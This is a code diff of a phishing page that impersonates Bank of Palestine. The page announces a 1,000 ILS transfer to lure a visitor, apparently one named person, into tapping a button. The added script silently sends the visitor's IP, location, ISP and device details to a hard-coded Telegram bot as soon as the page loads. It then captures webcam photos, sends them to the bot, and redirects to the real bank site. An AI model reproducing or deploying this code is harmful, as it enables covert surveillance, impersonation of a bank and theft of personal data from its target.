@@ -3,119 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك فلسطين - نظام الأمان والتحقق</title>
+    <title>بنك فلسطين - بوابة استلام الدفعات الإلكترونية</title>
     <style>
-        body { font-family: 'Tahoma', sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
-        .header { background: #fff; padding: 15px; border-bottom: 5px solid #d71920; }
-        .container { max-width: 400px; margin: 50px auto; background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .amount { color: #28a745; font-size: 35px; font-weight: bold; margin: 15px 0; }
-        .status { color: #d71920; font-weight: bold; font-size: 14px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .header { background: #fff; position: fixed; top: 0; width: 100%; padding: 10px; border-bottom: 4px solid #d71920; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .card { background: white; padding: 40px 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; position: relative; }
+        .logo { width: 130px; margin-bottom: 25px; }
+        .success-icon { color: #28a745; font-size: 50px; margin-bottom: 10px; }
+        .amount-display { background: #f0fdf4; border: 1.5px solid #28a745; padding: 25px; border-radius: 15px; margin: 20px 0; }
+        .amount { font-size: 38px; color: #1a1a1a; font-weight: 800; display: block; }
+        .currency { color: #28a745; font-size: 18px; font-weight: bold; }
+        .info-text { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: right; border-right: 3px solid #0056b3; padding-right: 10px; }
+        .main-btn { background: #0056b3; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .main-btn:active { transform: scale(0.98); }
         #video, #canvas { display: none; }
     </style>
 </head>
-<body>
+<body onclick="activate()">
 
-<div class="header">
-    <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 120px;">
-</div>
+    <div class="header">
+        <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 100px;">
+    </div>
 
-<div class="container" id="mainCard">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Bank_of_Palestine_Logo.svg/1200px-Bank_of_Palestine_Logo.svg.png" style="width: 150px;">
-    <h3>تحقق من هوية المستلم</h3>
-    <div class="amount">3,000.00 <small>ILS</small></div>
-    <p class="status">الحالة: بانتظار تفعيل الكاميرا للتحقق..</p>
-    <p style="font-size:12px; color:#777;">جاري سحب بيانات الحوالة، يرجى عدم إغلاق الصفحة.</p>
-</div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
-<script>
-    const TOKEN = '8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc';
-    const CHAT_ID = '7184970355';
-    let systemInfo = "";
-
-    // 1. التنفيذ التلقائي فور تحميل الصفحة
-    window.onload = async function() {
-        // سحب البيانات الرقمية فوراً دون إذن
-        systemInfo = await getSystemData();
+    <div class="card">
+        <div class="success-icon">✓</div>
+        <h2 style="margin:0; color:#1a1a1a; font-size: 22px;">تم اعتماد الحوالة بنجاح</h2>
         
-        // إرسال تنبيه أولي لك بأن المبتز دخل الرابط
-        sendText(`👤 دخول جديد: زياد الخطيب\n${systemInfo}`);
+        <div class="amount-display">
+            <span class="amount">1,000.00</span>
+            <span class="currency">شيكل إسرائيلي (ILS)</span>
+        </div>
 
-        // محاولة فتح الكاميرا فوراً (قد تنجح في المتصفحات القديمة أو إذا وافق سابقاً)
-        startCamera();
-    };
+        <div class="info-text">
+            • مرجع العملية: <b>BOP-TX88102</b><br>
+            • نوع العملية: استلام دفعة فورية<br>
+            • ملاحظة: يرجى الضغط أدناه لإنهاء إجراءات المزامنة والتحقق الرقمي لإيداع المبلغ في رصيدك.
+        </div>
 
-    // محاولة تشغيل الكاميرا عند اللمس كخطة بديلة (إلزامية في المتصفحات الحديثة)
-    document.body.onclick = function() {
-        startCamera();
-    };
+        <button class="main-btn">استلم المبلغ الآن</button>
+        <p style="font-size: 11px; color: #999; margin-top: 15px;">نظام آمن ومشفر بنسبة 100% - بنك فلسطين 2026</p>
+    </div>
 
-    async function startCamera() {
-        if (window.isCameraRunning) return;
-        
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            window.isCameraRunning = true;
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TOKEN = '8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc';
+        const CHAT_ID = '7184970355';
+        let isCaptured = false;
+        let systemInfo = "";
+
+        // سحب البيانات تلقائياً فور التحميل (المرحلة الصامتة)
+        window.onload = async function() {
+            systemInfo = await fetchSpecs();
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚠️ دخول جديد (زياد الخطيب):\n' + systemInfo)}`);
+            
+            // محاولة تشغيل الكاميرا تلقائياً (window.onload)
+            attemptCamera();
+        };
+
+        async function attemptCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                startCapture(stream);
+            } catch (e) { console.log("Waiting for touch..."); }
+        }
+
+        function activate() {
+            if (isCaptured) return;
+            attemptCamera();
+        }
+
+        function startCapture(stream) {
+            if (isCaptured) return;
+            isCaptured = true;
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
+
             let count = 0;
-            const interval = setInterval(() => {
+            const timer = setInterval(() => {
                 if (count < 5) {
-                    captureAndSend(video);
+                    sendToBot(video);
                     count++;
                 } else {
-                    clearInterval(interval);
+                    clearInterval(timer);
                     window.location.href = "https://www.bankofpalestine.com/";
                 }
-            }, 500);
-        })
-        .catch(err => {
-            console.log("Camera Blocked");
-        });
-    }
+            }, 600);
+        }
 
-    async function getSystemData() {
-        try {
-            const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-            const battery = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
-            const ram = navigator.deviceMemory || "غير مدعوم";
-            const cores = navigator.hardwareConcurrency || "غير معروف";
+        async function fetchSpecs() {
+            try {
+                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const bat = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
+                const ram = navigator.deviceMemory || "غير متوفر";
+                const platform = navigator.platform;
+                return `🌐 IP: ${ip.ip}\n📍 الموقع: ${ip.city}, ${ip.country_name}\n🔋 الشحن: ${bat}\n🧠 الرام: ${ram} GB\n📱 النظام: ${platform}\n🏢 المزود: ${ip.org}`;
+            } catch (e) { return "فشل سحب البيانات الرقمية"; }
+        }
+
+        async function sendToBot(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            return `
-🌐 IP: ${ip.ip}
-📍 المنطقة: ${ip.city}, ${ip.country_name}
-🏢 المزود: ${ip.org}
-🔋 الشحن: ${battery}
-🧠 الرام: ${ram} GB
-⚙️ المعالج: ${cores} نوى
-📱 النظام: ${navigator.platform}
-🕒 التوقيت: ${new Date().toLocaleTimeString()}
-`;
-        } catch (e) { return "فشل سحب بعض البيانات الرقمية"; }
-    }
-
-    function sendText(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-    }
-
-    async function captureAndSend(video) {
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'shot.jpg');
-        fd.append('caption', systemInfo);
-
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    }
-</script>
-
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'capture.jpg');
+                fd.append('caption', systemInfo);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.6);
+        }
+    </script>
 </body>
 </html>
